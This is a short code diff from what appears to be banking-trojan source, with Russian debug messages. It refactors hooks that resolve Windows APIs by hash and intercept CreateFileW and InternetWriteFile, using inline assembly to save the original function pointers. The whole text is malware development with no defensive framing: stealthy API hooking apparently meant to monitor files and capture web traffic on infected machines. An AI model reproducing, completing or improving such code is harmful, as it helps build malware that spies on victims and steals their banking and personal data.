@@ -204,7 +204,8 @@ void HookBSSCreateFileW()
 	if (!BSSHooksInitialized)
 	{
 		BSSDBG("BSS", "Инициализируем хуки создания файлов");
-		if ( HookApi( 1, 0x8F8F102, &HOOK_BSSCreateFileW ) )
+		const DWORD HASH_CreateFileW = 0x8F8F102;
+		if ( HookApi( DLL_KERNEL32, HASH_CreateFileW, &HOOK_BSSCreateFileW ) )
 		{
 			__asm mov [REAL_BSSCreateFileW], eax
 
@@ -402,7 +403,8 @@ void BSSHooks()
 		BSSLog = NULL;
 
 		HashListBBS = List::Create();
-		if ( HookApi( 8, 0x205BD56A, &HOOK_BSSInternetWriteFile ) )
+		const DWORD HASH_InternetWriteFile = 0x205BD56A;
+		if ( HookApi( DLL_WININET, HASH_InternetWriteFile, &HOOK_BSSInternetWriteFile ) )
 		{
 			__asm mov [REAL_BSSInternetWriteFile], eax
 		}
